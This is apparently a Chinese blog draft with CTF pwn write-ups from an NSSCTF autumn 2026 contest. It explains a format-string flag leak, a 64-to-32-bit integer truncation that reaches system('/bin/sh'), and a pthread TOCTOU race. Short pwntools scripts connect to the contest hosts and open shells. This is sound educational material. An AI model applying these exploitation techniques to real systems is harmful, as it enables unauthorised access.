+++
date = '2026-10-28T22:13:41+08:00'
draft = true
title = 'NSSCTF 2026秋季赛'
tags = ["pwn"]
categories = ["CTF"]
description = ""
+++

## nc签到？黑盒

显然是一个格式化字符串，根据提示，我们是可以直接将flag泄露出来，所以用%s就行了。从%1$s开始一个一个试，这里在%8$s出来了

![图1](D:\my-blog\static\images\NSSCTF-2026秋季赛\图1.png)

## never_arrive

这里给出main:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  if ( (int)vuln() <= 255 )
    system("/bin/sh");
  puts(&s_);
  puts("try again?");
  return 0;
}
```

这里要求vuln返回值<=255，进vuln看看

```c
__int64 vuln()
{
  _QWORD v1[2]; // [rsp+0h] [rbp-10h] BYREF

  v1[1] = __readfsqword(0x28u);
  v1[0] = 0LL;
  puts(&s);
  __isoc99_scanf("%lld", v1);
  if ( v1[0] <= 255LL )
    exit(0);
  return v1[0];
}
```

单纯看这段代码：**这里本身没有溢出！**
`__readfsqword(0x28)` = canary 栈保护标记；

- v1 数组只有两个 QWORD，scanf 只写入 v1 [0] 这一个位置；
- 它只覆盖 `v1[0]`，不会往后写 canary、rbp、返回地址。
可以发现，`scanf("%lld")`接收 64 位十进制整数，不是字符串，**不能输入 \x00 这类原始字节**
那怎么办呢？
两条约束，同时要满足：

1. **vuln 内部判断：`v1[0] > 255`**，否则 vuln 直接 exit，根本不会返回到 main！
2. **main 里判断：`(int)v1_ret <= 255`**，才会触发 `system("/bin/sh")`

那怎么办呢？
原理：64bit → 强制截断到 32 位有符号 int

`scanf("%lld")` 读进来是 64 位 long long
C 语言强制 `(int)val` 的行为：**只保留低 32 比特，当成 signed int**。
我们要构造一个 X：

- 低 32bit 的值（signed int） ≤ 255
- 完整 64bit 数值 > 255

最简单构造：
让**低 32 位 = 0**
也就是：

```plaintext
二进制：0000 0000 0000 0000 0000 0000 0001 0000 0000 0000 0000 0000 0000 0000 0000 0000
十六进制：0x00000001 00000000
十进制：4294967296
```

![图2](D:\my-blog\static\images\NSSCTF-2026秋季赛\图2.png)

这里本地测试一下，发现已经拿到shell了

![图3](D:\my-blog\static\images\NSSCTF-2026秋季赛\图3.png)

简单写个脚本远程试一下

```python
from pwn import *
io = remote('node10.anna.nssnode.cn',29453)
io.recv()
io.sendline(b'4294967296')
io.interactive()
```

![图4](D:\my-blog\static\images\NSSCTF-2026秋季赛\图4.png)

## creeper?

进入漏洞函数内

```c
unsigned __int64 sub_152A()
{
  int n2; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Steve: I want to craft a diamond pickaxe. Can you help me?");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          puts("1.Mining");
          puts("2.Break dead bushes");
          puts("3.Check materials");
          puts("4.Craft a diamond pickaxe");
          puts("5.But I refuse");
          printf("> ");
          n2 = sub_1317();
          if ( n2 != 1 )
            break;
          if ( !dword_4018 )
            goto LABEL_4;
          printf("Mining");
          putchar(46);
          putchar(46);
          putchar(46);
          putchar(10);
          puts("OK.");
          sub_144B(sub_137B);
        }
        if ( n2 != 2 )
          break;
        if ( dword_401C )
        {
          printf("Breaking");
          putchar(46);
          putchar(46);
          putchar(46);
          putchar(10);
          puts("OK.");
          sub_144B(sub_13E3);
        }
        else
        {
LABEL_4:
          puts("You can only do this once!");
        }
      }
      if ( n2 != 3 )
        break;
      printf("diamond: %d\n", n2);
      printf("stick: %d\n", dword_4014);
    }
    if ( n2 == 4 )
      break;
    if ( n2 == 5 )
      exit(0);
    puts("invalid input!");
  }
  if ( n2 <= 2 || dword_4014 <= 1 )
  {
    puts("Not enough!\n");
    exit(0);
  }
  puts("Craft success.");
  sub_14CB();
  return v2 - __readfsqword(0x28u);
}
```

`sub_14CB()`是个后门
这个程序是一个基于 pthread 的菜单式程序（pwn，x86-64 PIE，包含 system），关键全局变量位于 .data 段：

|地址|含义|初值|
|---|---|---|
|0x4010|diamond（钻石）|数量0|
|0x4014|stick（木棍）|数量0|
|0x4018|Mining|可用标志1|
|0x401c|Breaking|可用标志1|
|0x404c|线程计数|0|

核心逻辑：

选择 1 时，如果 0x4018 != 0，程序会 pthread_create 一个挖矿线程，然后立即返回菜单；该线程先检查标志，再执行 usleep(100000)（持续 100 ms），然后把 diamond 加 1，并将标志清零。
选择 2 时同理，由对应线程把 stick 加 1。
选择 4 时，只有当 diamond > 2 且 stick > 1 才能合成；合成成功后会调用 gift()，其中的 system("$0") 直接起一个 shell。
问题在于检查与清零之间存在 100 ms 的竞态窗口（TOCTOU）：主线程只看到标志仍为 1 就不断创建线程，而在 100 ms 内创建的每个线程都已经通过了标志检查，醒来后都会执行 +1。因此，在窗口内连续发送 3 次 1、2 次 2，就能得到 3 个 diamond 和 2 个 stick，满足合成条件，再选择 4 即获得 shell。
随便挑选一个看看

```c
unsigned __int64 __fastcall sub_144B(void *(*start_routine)(void *))
{
  pthread_t newthread; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( n127 > 127 )
    exit(0);
  pthread_create(&newthread, 0LL, start_routine, 0LL);
  pthread_detach(newthread);
  ++n127;
  return v3 - __readfsqword(0x28u);
}
```

```python
from pwn import *
import time
io = remote('node10.anna.nssnode.cn',28450)
io.recvuntil(b'>')
io.send(b'1\n' * 3)
io.send(b'2\n' * 2)
time.sleep(0.5)
io.send(b'3\n')          # 确认 diamond: 3 / stick: 2
io.send(b'4\n')          # 合成 -> system("$0") -> shell
io.interactive()
```

![图5](D:\my-blog\static\images\NSSCTF-2026秋季赛\图5.png)
